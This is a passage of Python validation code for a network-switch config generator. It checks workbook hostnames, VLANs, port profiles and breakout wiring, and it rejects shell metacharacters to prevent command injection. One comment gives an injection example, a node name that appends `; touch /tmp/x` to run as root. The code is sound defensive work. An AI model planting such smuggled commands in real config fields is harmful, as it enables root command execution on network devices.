# Node / system names are hostnames. They are used three ways, all of which
# require this charset:
#   * rendered UNQUOTED as `nv set interface <bond> description <name>` in a
#     root-executed config — a name of `node; touch /tmp/x` executes as root;
#   * written verbatim into the generated ansible `inventory/hosts`;
#   * used as an NVUE object name, where a space silently truncates the value.
#
# Deliberately stricter than _SHELL_META_RE, which permits spaces and `/`.
# Verified against all twelve shipped workbooks: 33,201 names, zero characters
# outside this set — so the strictness costs nothing.
_HOSTNAME_RE = re.compile(r'^[A-Za-z0-9._-]+$')

# (sheet, {column-header: label}) — resolved BY HEADER NAME, never by position
# (ERA-81), and skipped silently when the sheet or column is absent.
_HOSTNAME_COLUMNS = (
    ("Nodes", {"Name": "node Name"}),
    ("Wire Map", {"System Name (A)": "System Name (A)",
                  "System Name (B)": "System Name (B)"}),
)


def validate_node_name_charset(wb, result):
    """Node and Wire Map system names must be valid hostnames."""
    seen = set()
    for sheet, columns in _HOSTNAME_COLUMNS:
        if sheet not in wb.sheetnames:
            continue
        ws = wb[sheet]
        header = [str(c.value or '').strip() for c in ws[1]]
        for col_name, label in columns.items():
            if col_name not in header:
                continue
            col = header.index(col_name) + 1
            for row in range(2, ws.max_row + 1):
                raw = ws.cell(row, col).value
                if raw in (None, ''):
                    continue
                text = str(raw).strip()
                if not text or text in seen:
                    continue
                if _HOSTNAME_RE.match(text):
                    continue
                seen.add(text)
                result.error(sheet,
                             f"{label} {text!r} is not a valid hostname — only "
                             f"letters, digits, dot, underscore and hyphen are "
                             f"allowed. This name is rendered unquoted into a "
                             f"root-executed config (`nv set interface <bond> "
                             f"description <name>`) and written into the generated "
                             f"ansible inventory, so shell metacharacters and "
                             f"spaces are rejected to prevent command injection.")


def validate_unquoted_excel_cells(wb, result):
    """Reject shell metacharacters in every Excel cell that renders unquoted.

    The Settings sheet has had this protection since the 2026-06-30 security
    review (SHELL_INJECTION_PRONE_KEYS). These are the operator-supplied cells
    on the other sheets that reach a template verbatim — VRF and VLAN names,
    the Port Profiles VRF/Speed/Auto-Negotiate columns, and the policy sheets'
    names, actions and match values.
    """
    for sheet, section, columns in _UNQUOTED_EXCEL_CELLS:
        if sheet not in wb.sheetnames:
            continue
        ws = wb[sheet]
        if section is None:
            start, stop_on_blank = 2, False
        else:
            hdr = None
            for row in range(1, min(ws.max_row, 200) + 1):
                if str(ws.cell(row, 1).value or '').strip() == section:
                    hdr = row
                    break
            if hdr is None:
                continue
            start, stop_on_blank = hdr + 1, True
        for row in range(start, ws.max_row + 1):
            first = ws.cell(row, 1).value
            if stop_on_blank and first in (None, ''):
                break
            if not stop_on_blank and all(
                    ws.cell(row, c).value in (None, '') for c in columns):
                continue
            row_label = f"row {row}" + (
                f" ({str(first).strip()})" if first not in (None, '') else "")
            for col, label in sorted(columns.items()):
                _check_unquoted_cell(sheet, row_label, label,
                                     ws.cell(row, col).value, result)


def validate_port_profile_shell_safety(ws, result):
    """Retained name — the Port Profiles columns are covered by
    validate_unquoted_excel_cells, which also covers VRF/VLAN names and the
    policy sheets. Kept as a thin alias so any external caller keeps working."""
    return


def validate_port_profiles(ws, result):
    """Validate the Port Profiles section of VLANs & Profiles.

    Rules:
      - Port Mode must be one of access / trunk / hybrid / L3
        (case-insensitive). Other values silently misconfigure ports.
      - When Port Mode is L3 the port is unbridged — Allowed VLANs,
        Untagged, LACP Bypass are meaningless and indicate operator
        confusion about the profile shape. Warn so they fix one or
        the other.
      - When Port Mode is L3 a VRF column value is REQUIRED; the L3
        port has to land in *some* VRF.

    Designed for the STORAGE VRF rollout (Storage Uplink profile uses
    Port Mode = L3), but applies generally: any L3 port the operator
    declares goes through these checks.
    """
    in_section = False
    header_row = None
    col_map = {}
    for row in range(1, ws.max_row + 1):
        val = ws.cell(row=row, column=1).value
        if isinstance(val, str) and val.strip() == 'Port Profiles':
            in_section = True
            continue
        if not in_section:
            continue
        if not val:
            break  # blank row ends the section
        val_str = str(val).strip()
        if val_str == 'DHCP Relay':
            break  # next section
        if val_str == 'Profile':
            # Column-header row — capture positions of optional columns.
            header_row = row
            for c in range(1, ws.max_column + 1):
                h = ws.cell(row=row, column=c).value
                if h:
                    col_map[str(h).strip().lower()] = c
            continue
        if header_row is None:
            continue  # data row without a header — skip
        name = val_str
        mode_raw = ws.cell(row=row, column=col_map.get('port mode', 2)).value
        if mode_raw is None or str(mode_raw).strip() == '':
            continue  # blank row inside section — already handled by parser
        mode = str(mode_raw).strip().lower()
        if mode not in _VALID_PORT_MODES:
            result.error("VLANs & Profiles",
                         f"Port Profiles row {row} ('{name}'): Port Mode "
                         f"'{mode_raw}' is not recognized. Allowed: "
                         f"{', '.join(sorted(_VALID_PORT_MODES))}.")
            continue
        # Catch the Excel-autocast-ate-the-commas footgun. Operator types
        # '400,500' into the Allowed VLANs cell; Excel decides it's a number
        # and stores it as 400500. Parser then emits `vlan 400500`, NVUE
        # rejects (out of 1-4094), era-apply.service fails at first boot.
        # Same for Native/Access and Untagged columns. Fail loud at validation
        # so this can't reach a deploy again.
        for vlan_col_label in ('native/access vlan', 'allowed vlans', 'untagged vlan'):
            vc = col_map.get(vlan_col_label)
            if not vc:
                continue
            cv = ws.cell(row=row, column=vc).value
            if cv in (None, ''):
                continue
            # Coerce numeric cells to int up front so float autocast (e.g.
            # Excel saving as 400500.0) doesn't slip past the int(tok) parse
            # below — `int('400500.0')` would raise ValueError and the token
            # would be silently skipped, defeating the whole guard.
            if isinstance(cv, float) and cv.is_integer():
                cv = int(cv)
            tokens = [t.strip() for t in str(cv).split(',') if t.strip()]
            for tok in tokens:
                try:
                    vid = int(tok)
                except ValueError:
                    # Try float-shaped strings ("400500.0") before giving up.
                    try:
                        f = float(tok)
                        vid = int(f) if f.is_integer() else None
                    except ValueError:
                        vid = None
                    if vid is None:
                        continue
                if vid < 1 or vid > 4094:
                    hint = (' — looks like Excel auto-cast a comma-separated '
                            'list into a single number. Format the cell as Text '
                            'and re-enter (e.g. "400,500"), or prefix with an '
                            "apostrophe ('400,500).") if vid > 4094 and ',' not in str(cv) else ''
                    result.error("VLANs & Profiles",
                                 f"Port Profiles row {row} ('{name}'): "
                                 f"{vlan_col_label.title()} value {cv!r} contains "
                                 f"VLAN id {vid} outside the valid 1-4094 range."
                                 f"{hint}")
        # Breakout / Lanes must be positive integers. excel_parser does a bare
        # int() on these when building port profiles, so a non-numeric cell
        # (e.g. "4x", "two") crashes `make generate`/`make deploy` with an
        # uncaught ValueError. Catch it here with an actionable message.
        numeric = {}
        for num_label in ('breakout', 'lanes'):
            nc = col_map.get(num_label)
            if not nc:
                continue
            nv = ws.cell(row=row, column=nc).value
            if nv in (None, ''):
                continue
            ok = (isinstance(nv, (int, float)) and float(nv).is_integer() and int(nv) > 0) \
                or (isinstance(nv, str) and nv.strip().isdigit() and int(nv.strip()) > 0)
            if not ok:
                result.error("VLANs & Profiles",
                             f"Port Profiles row {row} ('{name}'): {num_label.title()} "
                             f"value {nv!r} must be a positive whole number (e.g. 4). "
                             f"A non-numeric value crashes `make generate`.")
            else:
                numeric[num_label] = int(float(nv))

        # The pair has to be one the config template can render -- see
        # _RENDERABLE_BREAKOUT_LANES. An unrenderable pair produces a config
        # that passes every check here and then fails on the switch, which is
        # the worst place to find out.
        bk, ln = numeric.get('breakout'), numeric.get('lanes')
        if bk is not None and ln is not None and bk > 1 \
                and (bk, ln) not in _RENDERABLE_BREAKOUT_LANES:
            valid = ', '.join(f"{b}x/{l}-lane" for b, l in
                              sorted(_RENDERABLE_BREAKOUT_LANES, reverse=True))
            result.error("VLANs & Profiles",
                         f"Port Profiles row {row} ('{name}'): Breakout {bk}x with "
                         f"Lanes {ln} is not a supported combination "
                         f"({bk} x {ln} = {bk * ln} lanes; one SN5600/SN5610 cage "
                         f"has 8). Supported: {valid}. The config template would "
                         f"emit no breakout line for these ports while still "
                         f"referencing their sub-ports, so the switch would "
                         f"reject the config at apply time.")

        if mode == 'l3':
            # L3 ports are unbridged. Allowed VLANs / Untagged /
            # LACP Bypass are L2 concepts.
            for incompat_label, incompat_col in (
                    ('Allowed VLANs', col_map.get('allowed vlans')),
                    ('Untagged VLAN', col_map.get('untagged vlan')),
                    ('LACP Bypass', col_map.get('lacp bypass'))):
                if not incompat_col:
                    continue
                cell_val = ws.cell(row=row, column=incompat_col).value
                # Treat explicit-off ('No', 'false', 0) the same as unset —
                # operators commonly leave the cell as 'No' meaning "feature
                # disabled" which is what L3 mode wants anyway.
                if cell_val in (None, '', 0):
                    continue
                if isinstance(cell_val, bool) and cell_val is False:
                    continue
                if isinstance(cell_val, str) and cell_val.strip().lower() in ('no', 'false', '0'):
                    continue
                result.warn("VLANs & Profiles",
                            f"Port Profiles row {row} ('{name}'): Port Mode "
                            f"= L3 but '{incompat_label}' is set ({cell_val!r}). "
                            f"L3 ports are unbridged; the value is ignored.")
            vrf_col = col_map.get('vrf')
            vrf_val = ws.cell(row=row, column=vrf_col).value if vrf_col else None
            if vrf_val is None or str(vrf_val).strip() == '':
                result.error("VLANs & Profiles",
                             f"Port Profiles row {row} ('{name}'): Port Mode "
                             f"= L3 requires a VRF assignment. L3 ports must "
                             f"live in some VRF; default VRF works for a "
                             f"local-loopback peer, otherwise pick a declared "
                             f"VRF (e.g. STORAGE for external storage uplinks).")


def _collect_port_profile_names(ws):
    """Return the set of Port Profile row names from VLANs & Profiles."""
    profiles = set()
    in_section = False
    for row in range(1, ws.max_row + 1):
        val = ws.cell(row=row, column=1).value
        if isinstance(val, str) and val.strip() == 'Port Profiles':
            in_section = True
            continue
        if not in_section:
            continue
        if not val:
            # Blank row → end of section
            break
        val_str = str(val).strip()
        if val_str in ('Profile', 'DHCP Relay'):
            # Header row or next section
            if val_str == 'DHCP Relay':
                break
            continue
        profiles.add(val_str)
    return profiles


def validate_gpu_vlan_mode_consistency(settings, parsed_vlans, result):
    """Cross-check Settings.gpu_vlan_mode against the actual VLAN rows.

    - per_rail mode: must have at least one `gpu_rail<N>` VLAN row.
    - per_rail_per_plane mode: must have at least one `gpu_rail<R>_plane<P>` row.
    - single mode: warn if any `gpu_rail*` rows are present (operator
      likely forgot to flip the mode).

    Catches the silent-failure case where an operator sets the mode but
    forgets to add the matching VLAN rows — the parser would otherwise
    fall back to no per-rail emission and the operator wouldn't know
    until they inspected the generated configs.
    """
    mode = str(settings.get('gpu_vlan_mode') or 'single').strip().lower()
    if mode not in ('single', 'per_rail', 'per_rail_per_plane'):
        # validate_settings already emits an error for invalid mode
        return

    rail_rows = []
    rail_plane_rows = []
    for v in parsed_vlans:
        name = (v.get('name') or '').strip().lower()
        if re.match(r'^gpu_rail\d+_plane\d+$', name):
            rail_plane_rows.append(name)
        elif re.match(r'^gpu_rail\d+$', name):
            rail_rows.append(name)

    if mode == 'per_rail':
        if not rail_rows:
            result.error("Settings",
                         "gpu_vlan_mode = 'per_rail' but no gpu_rail<N> "
                         "VLAN rows exist in VLANs & Profiles. "
                         "Add rows named gpu_rail1, gpu_rail2, … (one per "
                         "rail) with VRF=GPU, or change gpu_vlan_mode to 'single'.")
        if rail_plane_rows:
            result.error("Settings",
                         f"gpu_vlan_mode = 'per_rail' but gpu_rail<R>_plane<P> "
                         f"rows are present ({len(rail_plane_rows)}). "
                         f"Switch to 'per_rail_per_plane' mode, or rename "
                         f"the rows to gpu_rail<N> (drop the _plane suffix).")
    elif mode == 'per_rail_per_plane':
        if not rail_plane_rows:
            result.error("Settings",
                         "gpu_vlan_mode = 'per_rail_per_plane' but no "
                         "gpu_rail<R>_plane<P> VLAN rows exist in "
                         "VLANs & Profiles. Add rows named "
                         "gpu_rail1_plane1, gpu_rail1_plane2, gpu_rail2_plane1, … "
                         "(one per rail × plane combination) with VRF=GPU.")
        if rail_rows:
            result.error("Settings",
                         f"gpu_vlan_mode = 'per_rail_per_plane' but plain "
                         f"gpu_rail<N> (no _plane suffix) rows are present "
                         f"({len(rail_rows)}). Either add _plane<P> to each "
                         f"row name, or switch to 'per_rail' mode.")
    elif mode == 'single':
        if rail_rows or rail_plane_rows:
            count = len(rail_rows) + len(rail_plane_rows)
            result.warn("Settings",
                        f"gpu_vlan_mode = 'single' but {count} gpu_rail* "
                        f"VLAN row(s) are defined — they will be ignored "
                        f"by the parser. Set gpu_vlan_mode = 'per_rail' "
                        f"(or 'per_rail_per_plane') to use them, or "
                        f"delete the unused rows.")


def validate_8x_breakout_odd_ports(ws, result, sheet_name="Wire Map"):
    """Enforce the 8x-breakout convention: odd base port + adjacent disabled.

    On Spectrum switches, configuring a port for 8-way breakout consumes
    the lanes of the adjacent (next-higher) cage. The conventional layout
    pairs an ODD base port (8x configured) with the EVEN port one above
    it (consumed; not independently usable).

    Detected from the Wire Map: a port is 8x-broken-out when any sub-port
    index >= 4 (`swpNs4`..`swpNs7`) appears for that base. 4x breakout
    exposes only s0..s3; 8x extends to s4..s7. Reliable signal.

    Rules:
      1. ERROR if the 8x base port is EVEN — convention violation; the
         adjacent (base+1) port would have to be odd, which breaks the
         odd-canonical-even-consumed pairing.
      2. ERROR if the adjacent port (base+1) has ANY live Display=Yes
         row pointing at a non-disabled Network Profile — that port is
         supposed to be consumed by the 8x breakout, not independently
         cabled.
    """
    # Build column lookup (header-name with positional fallback)
    headers = {}
    for c in range(1, ws.max_column + 1):
        h = ws.cell(1, c).value
        if h:
            headers[str(h).strip().lower()] = c

    display_col = headers.get('display in air', 1)
    sysname_a_col = headers.get('system name (a)',
                    headers.get('system name', 2))
    port_a_col = headers.get('port (a)', headers.get('nic/port', 3))
    sysname_b_col = headers.get('system name (b)',
                    headers.get('switch name', 5))
    port_b_col = headers.get('port (b)', headers.get('switch port', 6))
    np_col = headers.get('network profile')

    def _parse(port_str):
        """Return (base, sub) or None. sub is None when no sub-port."""
        if not port_str:
            return None
        m = re.match(r'^swp(\d+)(?:s(\d+))?$', str(port_str).strip(),
                     re.IGNORECASE)
        if not m:
            return None
        return (int(m.group(1)),
                int(m.group(2)) if m.group(2) is not None else None)

    # Pass 1: walk every row, build {(switch, base_port): max_sub_idx} map.
    # Consider BOTH sides of each row — a sub-port can appear in either
    # the A column or the B column (cluster-to-cluster ISL rows have
    # switch names on both sides).
    breakout = {}
    for r in range(2, ws.max_row + 1):
        for sw_col, port_col in [(sysname_a_col, port_a_col),
                                  (sysname_b_col, port_b_col)]:
            sw = ws.cell(r, sw_col).value
            port = ws.cell(r, port_col).value
            if not sw or not port:
                continue
            parsed = _parse(port)
            if parsed is None or parsed[1] is None:
                continue
            base, sub = parsed
            key = (str(sw).strip(), base)
            if key not in breakout or sub > breakout[key]:
                breakout[key] = sub

    # 8x-breakout candidates: any base with max sub_idx >= 4
    eight_x_ports = sorted([(sw, b) for (sw, b), s in breakout.items()
                            if s >= 4])

    # Pass 2: index all live cabling by (switch, base_port). A row counts
    # as "live" if Display=Yes AND its Network Profile is not a known
    # disabled/unused marker.
    DISABLED_PROFILE_KEYWORDS = ('disabled', 'unused', 'do not connect')
    live_rows_by_port = {}  # (switch, base) -> list of (row, port_str, profile)
    for r in range(2, ws.max_row + 1):
        display = str(ws.cell(r, display_col).value or '').strip().lower()
        if display != 'yes':
            continue
        np = ws.cell(r, np_col).value if np_col else None
        np_lower = str(np or '').lower()
        if any(kw in np_lower for kw in DISABLED_PROFILE_KEYWORDS):
            continue
        for sw_col, port_col in [(sysname_a_col, port_a_col),
                                  (sysname_b_col, port_b_col)]:
            sw = ws.cell(r, sw_col).value
            port = ws.cell(r, port_col).value
            if not sw or not port:
                continue
            parsed = _parse(port)
            if parsed is None:
                continue
            base = parsed[0]
            key = (str(sw).strip(), base)
            live_rows_by_port.setdefault(key, []).append(
                (r, str(port).strip(), np))

    # Pass 3: emit rules
    for sw, base in eight_x_ports:
        # Rule 1: base must be odd
        if base % 2 == 0:
            result.error(
                sheet_name,
                f"{sw}: swp{base} has 8x breakout (sub-port s4-s7 in use), "
                f"but base port number is EVEN. The convention is to "
                f"configure 8x on the ODD port and leave the adjacent "
                f"even port disabled. Move to swp{base - 1} or swp{base + 1} "
                f"(whichever is odd) and re-wire."
            )
            continue
        # Rule 2: adjacent base+1 must not be live-cabled
        adj_key = (sw, base + 1)
        if adj_key in live_rows_by_port:
            adj_rows = live_rows_by_port[adj_key]
            sample = ', '.join(
                f"row {r} ({p}, profile={np!r})" for r, p, np in adj_rows[:3]
            )
            if len(adj_rows) > 3:
                sample += f", ... ({len(adj_rows)} total)"
            result.error(
                sheet_name,
                f"{sw}: swp{base} has 8x breakout consuming the lanes of "
                f"swp{base + 1}, but swp{base + 1} has live Display=Yes "
                f"cabling: {sample}. The 8x breakout makes swp{base + 1} "
                f"unusable independently — remove its rows or mark them "
                f"with a 'Disabled by Neighbor' / 'Unused' Network Profile."
            )


def validate_wiremap_network_profiles(wb, result):
    """Verify every Wire Map row's Network Profile resolves to something.

    A profile is valid if it matches one of:
      - A row name in the Port Profiles section of VLANs & Profiles
      - A VLAN row name matching gpu_rail<N>[_plane<P>] (rail/plane modes)
      - A VLAN row name matching gpu_plane<N> (dual-plane mode)
      - Starts with 'Air -' (Air-injected infrastructure rows)
      - Is blank/None (skipped row)

    Anything else is an undefined profile — likely a typo or a missing
    Port Profiles entry. Severity: error (parser silently skips bad
    rows otherwise).
    """
    if 'VLANs & Profiles' not in wb.sheetnames:
        return  # nothing to validate against

    ws_vp = wb['VLANs & Profiles']
    valid_port_profiles = _collect_port_profile_names(ws_vp)

    # Collect VLAN row names too (gpu_rail*_plane*, gpu_plane*, etc.).
    # These don't appear in Port Profiles but the parser handles them
    # via regex matching.
    vlan_names = set()
    for row in range(3, ws_vp.max_row + 1):
        vid = ws_vp.cell(row=row, column=1).value
        if vid is None or not isinstance(vid, int):
            break
        name = ws_vp.cell(row=row, column=2).value
        if name:
            vlan_names.add(str(name).strip())

    # Walk Wire Map + Air_Only rows; error on undefined profiles.
    for sheet_name in ('Wire Map', 'Air_Only'):
        if sheet_name not in wb.sheetnames:
            continue
        sheet_kind = 'air_only' if sheet_name == 'Air_Only' else 'wiremap'
        ws = wb[sheet_name]
        try:
            col_map = build_wiremap_column_map(ws, sheet_kind=sheet_kind)
        except ValueError:
            # Metadata-only sheet; nothing to validate
            continue
        profile_col = col_map.get('network_profile')
        if not profile_col:
            continue

        for row in range(2, ws.max_row + 1):
            prof = ws.cell(row=row, column=profile_col).value
            if prof is None:
                continue
            prof_str = str(prof).strip()
            if not prof_str:
                continue
            # Disable markers: exact-match against the allow-list.
            # Substring matching on 'disabled' previously accepted
            # `'Air - Disabled Test'` and `'disabled-port'`, both of
            # which the parser would treat differently from the operator's
            # apparent intent.
            prof_lower = prof_str.lower()
            if prof_lower in _DISABLE_MARKER_VALUES:
                continue
            # Air-prefixed → Air-injected, no Port Profiles entry needed
            if _AIR_PREFIX_RE.match(prof_str):
                continue
            # Port Profiles entry match (case-sensitive)
            if prof_str in valid_port_profiles:
                continue
            # gpu_rail<N>[_plane<P>] match: parse rail and plane numbers
            # from the profile, then build the expected VLAN row name
            # from parts. Substring-based normalization (replacing
            # whitespace with underscore) is wrong because it puts an
            # underscore before digits — VLAN convention is `gpu_rail1`
            # (no underscore between 'rail' and the digit).
            m_rp = re.match(
                r'^gpu[\s_-]*rail[\s_-]*(\d+)(?:[\s_-]*plane[\s_-]*(\d+))?$',
                prof_str, re.IGNORECASE)
            if m_rp:
                rail_idx = m_rp.group(1)
                plane_idx = m_rp.group(2)
                expected = (f'gpu_rail{rail_idx}_plane{plane_idx}'
                            if plane_idx else f'gpu_rail{rail_idx}')
                if expected in {v.lower() for v in vlan_names}:
                    continue
                result.error(sheet_name,
                             f"Row {row}: Network Profile '{prof_str}' "
                             f"matches gpu_rail pattern but no matching "
                             f"VLAN row '{expected}' is defined in "
                             f"VLANs & Profiles.")
                continue
            # gpu_plane<N> match (dual-plane mode without per-rail split)
            m_p = re.match(r'^gpu[\s_-]*plane[\s_-]*(\d+)$',
                           prof_str, re.IGNORECASE)
            if m_p:
                plane_idx = m_p.group(1)
                expected = f'gpu_plane{plane_idx}'
                if expected in {v.lower() for v in vlan_names}:
                    continue
                result.error(sheet_name,
                             f"Row {row}: Network Profile '{prof_str}' "
                             f"matches gpu_plane pattern but no matching "
                             f"VLAN row '{expected}' is defined.")
                continue
            # Unknown — error
            result.error(sheet_name,
                         f"Row {row}: Network Profile '{prof_str}' is not "
                         f"defined. Add it to the Port Profiles section "
                         f"of VLANs & Profiles, or fix the typo. "
                         f"(All port settings — mode, VLAN, breakout, "
                         f"speed — derive from Port Profiles + VLAN rows; "
                         f"profile names must match exactly.)")


def validate_wiremap_subports_fit_breakout(wb, result):
    """Every sub-port the Wire Map wires must be one the breakout creates.

    A physical port broken out 2x has sub-ports s0-s1 only. If the Wire Map
    wires swp7s2, the generated config still emits that sub-port into `type
    swp`, the bonds and the BGP neighbours — those lists come from the Wire Map
    independently of the breakout section. The result is a config that
    generates and validates cleanly, then fails at `nv config apply` on the
    switch, which is the worst place to find out.

    This is the same failure documented at _RENDERABLE_BREAKOUT_LANES, reached
    by a different route: not an illegal (breakout, lanes) pair, but a physical
    port claimed by two profiles with different breakouts, where the coarser
    one wins and silently truncates the other's sub-ports.

    Resolution order matters. core_nvue_cli.j2 emits the three buckets in
    4x -> 2x -> 8x order and NVUE is last-wins per port, so for a shared port
    8x beats 2x beats 4x. Modelled exactly here — checking against the
    *declared* breakout of each profile independently would miss the conflict,
    since each profile looks self-consistent on its own.
    """
    if 'VLANs & Profiles' not in wb.sheetnames or 'Wire Map' not in wb.sheetnames:
        return

    # profile name -> declared breakout
    ws = wb['VLANs & Profiles']
    hdr_row = None
    for r in range(1, min(ws.max_row, 60) + 1):
        if str(ws.cell(r, 1).value or '').strip() == 'Profile':
            hdr_row = r
            break
    if hdr_row is None:
        return
    declared = {}
    for r in range(hdr_row + 1, ws.max_row + 1):
        name = ws.cell(r, 1).value
        if not name:
            break
        try:
            bk = int(float(ws.cell(r, 9).value))
        except (TypeError, ValueError):
            continue
        declared[str(name).strip()] = bk

    wm = wb['Wire Map']
    header = [str(c.value or '').strip() for c in wm[1]]

    def col(name):
        return header.index(name) if name in header else None

    c_prof = col('Network Profile')
    sides = [(col('System Name (A)'), col('Port (A)')),
             (col('System Name (B)'), col('Port (B)'))]
    if c_prof is None or any(a is None or b is None for a, b in sides):
        return  # non-standard sheet; validate_wire_map reports the shape

    # (switch, port) -> {'subs': set, 'profiles': set}
    usage = defaultdict(lambda: {'subs': set(), 'profiles': set()})
    for row in wm.iter_rows(min_row=2, values_only=True):
        prof = str(row[c_prof] or '').strip()
        if prof and prof not in declared and _GPU_RAIL_PROFILE_RE.match(prof):
            # Per-rail GPU profiles ("GPU Rail 1 Plane 1") resolve to a VLAN
            # row, not a Port Profiles row, so they declare no breakout of
            # their own. They are still GPU access ports and share the GPU
            # profile's breakout. Without this they fall through the
            # `not in declared` skip below and the largest port population in
            # the fabric goes completely unchecked — silently.
            prof = _GPU_PROFILE_NAME
        if not prof or prof not in declared:
            continue  # unknown profiles are reported by the profile-name check
        for c_sys, c_port in sides:
            sysname = str(row[c_sys] or '').strip()
            m = SWP_PORT_RE.match(str(row[c_port] or '').strip())
            if not sysname or not m or m.group(2) is None:
                continue
            key = (sysname, int(m.group(1)))
            usage[key]['subs'].add(int(m.group(2)))
            usage[key]['profiles'].add(prof)

    for (sysname, port), data in sorted(usage.items()):
        breakouts = {declared[p] for p in data['profiles']}
        # Last-wins precedence as the template emits them: 8x, then 2x, then 4x.
        effective = next((b for b in (8, 2, 4) if b in breakouts),
                         max(breakouts) if breakouts else None)
        if effective is None:
            continue

        # 8x parity. On Spectrum an 8-way breakout consumes the adjacent
        # next-higher cage, so it must sit on an ODD base with the even
        # neighbour left free. excel_parser.assert_valid_8x_breakout enforces
        # this at generate time, but has a blind spot: the shipped 2-4-5-800
        # default emitted `swp8 link breakout 8x` (even) while separately
        # configuring swp9s0-s3 as ISL -- swp8's breakout eats swp9's lanes,
        # so the csl-to-csl ISL dies at `nv config apply`. Generation exited 0.
        # Check it here too, where the Wire Map makes the parity obvious.
        if effective == 8 and port % 2 == 0:
            claim = ', '.join(f"{p} ({declared[p]}x)"
                              for p in sorted(data['profiles']))
            tail = (", which does not exist on this switch"
                    if port >= 64 else "")
            result.error(
                "Wire Map",
                f"{sysname} swp{port}: renders as 8x breakout on an EVEN "
                f"port. 8x must sit on an ODD base so the adjacent even port "
                f"can be disabled; swp{port} would consume swp{port + 1}"
                f"{tail}. Claimed by: {claim}. Move it to an odd port.")

        impossible = sorted(s for s in data['subs'] if s >= effective)
        if not impossible:
            continue
        detail = ', '.join(f"{p} ({declared[p]}x)" for p in sorted(data['profiles']))
        result.error(
            "Wire Map",
            f"{sysname} swp{port}: wired to sub-port(s) "
            f"{', '.join('s' + str(s) for s in impossible)}, but the port "
            f"renders as {effective}x breakout (sub-ports s0-s{effective - 1} "
            f"only). Claimed by: {detail}. "
            + ("Two profiles claim this port with different breakouts and the "
               "coarser one wins. " if len(breakouts) > 1 else "")
            + "The config would reference sub-ports that were never created "
              "and be rejected at 'nv config apply'.")


# Switch functions whose port breakout is resolved from the Excel Port
# Profiles table. Deliberately its own set, not borrowed from any existing
# category list — see ADR-0041: reusing a named set because it looks close
# enough is how the OOB reachability check silently lost its scope.
#
# gl/gs/gsl are excluded because their breakout is NOT Excel-driven: the
# plane group_vars carry no breakout key and the gl template hardcodes 2x.
# Applying the Excel ISL profile's breakout to a gl parent reports 288
# phantom holes on 2-4-5-800, where the profile says 4x and the port
# renders 2x.
# ERA-73: gl/gs/gsl joined this set once their breakout level became
# Excel-driven. Before that the GPU fabric ignored the ISL profile and always
# rendered the template's hardcoded '2x', so applying the declared breakout to a
# gl parent produced FALSE POSITIVES — 288 phantom holes on 2-4-5-800 when that
# workbook's profile still declared 4x. The parser now emits `isl_breakout` onto
# the plane group_vars from the same sheet row that drives core/csl, so a finding
# here is real: if the profile says 4x, gl renders 4x and the Wire Map genuinely
# owes four sub-ports.
_EXCEL_DRIVEN_BREAKOUT_FUNCTIONS = {'core', 'csl', 'gl', 'gs', 'gsl'}

# Switch functions that terminate a NORTH/SOUTH fabric ISL. Wider than the
# breakout set above on purpose: that one scopes ADR-0049's sub-port accounting
# to single-tier designs, while the link COUNT must also see two-tier N/S
# fabrics, whose ISLs land on `cl`/`cs` rather than `core`/`csl`.
#
# Scoping the count to {core, csl} meant every `dedicated_leaf_spine` workbook
# counted ZERO ISL cables and warned that a correctly-cabled 512-link fabric
# was missing entirely — 2-4-5-800, 2-8-9-400-SP and 2-8-9-800 largescale all
# carried that false warning. Kept separate from the breakout set so widening
# the count does not silently widen ADR-0049's accounting scope.
_NS_FABRIC_ISL_FUNCTIONS = _EXCEL_DRIVEN_BREAKOUT_FUNCTIONS | {'cl', 'cs'}


def validate_isl_parents_fully_accounted(wb, result):
    """Every sub-port an ISL parent breaks out into must be accounted for.

    An ISL parent broken out 2x has s0 and s1. Wiring only s0 and saying
    nothing about s1 leaves half a physical port carrying no ISL capacity,
    with nothing in the workbook recording whether that was intended.

    The workbook already has a convention for deliberate non-use: a Wire Map
    row with the `Unused` network profile (2-8-9-800 `csl-01 swp59s2..s7` all
    carry one). What this check reports is the sub-port that is neither wired
    nor marked `Unused` — simply absent.

    Warning, not error: unlike validate_wiremap_subports_fit_breakout, an
    absent sub-port does not produce a config that `nv config apply` rejects.
    It is a capacity and record-keeping gap, so it is surfaced rather than
    made fatal.

    This does NOT check the ISL count against the arch model. The model's
    `fabrics.north_south.allocated_ports.isl` cannot serve as authority yet —
    it disagrees with four of six shipped defaults, mixes int and string SU
    keys ('7-8'), and returns `'default': 0` for SU counts that plainly have
    ISLs. See ADR-0049.
    """
    if 'VLANs & Profiles' not in wb.sheetnames or 'Wire Map' not in wb.sheetnames:
        return

    ws = wb['VLANs & Profiles']
    hdr_row = None
    for r in range(1, min(ws.max_row, 60) + 1):
        if str(ws.cell(r, 1).value or '').strip() == 'Profile':
            hdr_row = r
            break
    if hdr_row is None:
        return
    declared = {}
    for r in range(hdr_row + 1, ws.max_row + 1):
        name = ws.cell(r, 1).value
        if not name:
            break
        try:
            bk = int(float(ws.cell(r, 9).value))
        except (TypeError, ValueError):
            continue
        declared[str(name).strip()] = bk

    # switch name -> function, so gl/gs parents can be skipped. Resolved by
    # header name — see _nodes_switch_functions and ERA-81.
    functions = _nodes_switch_functions(wb)

    wm = wb['Wire Map']
    header = [str(c.value or '').strip() for c in wm[1]]

    def col(name):
        return header.index(name) if name in header else None

    c_prof = col('Network Profile')
    sides = [(col('System Name (A)'), col('Port (A)')),
             (col('System Name (B)'), col('Port (B)'))]
    if c_prof is None or any(a is None or b is None for a, b in sides):
        return  # non-standard sheet; validate_wire_map reports the shape

    # (switch, parent) -> accounted sub-ports (ANY profile, including Unused),
    # the sub-ports specifically wired as ISL, and the profiles claiming it.
    usage = defaultdict(lambda: {'seen': set(), 'isl': set(), 'profiles': set()})
    for row in wm.iter_rows(min_row=2, values_only=True):
        prof = str(row[c_prof] or '').strip()
        if not prof:
            continue
        for c_sys, c_port in sides:
            sysname = str(row[c_sys] or '').strip()
            m = SWP_PORT_RE.match(str(row[c_port] or '').strip())
            if not sysname or not m or m.group(2) is None:
                continue
            key = (sysname, int(m.group(1)))
            usage[key]['seen'].add(int(m.group(2)))
            if prof in declared:
                usage[key]['profiles'].add(prof)
            if prof.upper() == 'ISL':
                usage[key]['isl'].add(int(m.group(2)))

    for (sysname, port), data in sorted(usage.items()):
        if not data['isl']:
            continue  # not an ISL parent
        if functions.get(sysname) not in _EXCEL_DRIVEN_BREAKOUT_FUNCTIONS:
            continue
        breakouts = {declared[p] for p in data['profiles']}
        # Same last-wins precedence the template emits: 8x, then 2x, then 4x.
        effective = next((b for b in (8, 2, 4) if b in breakouts),
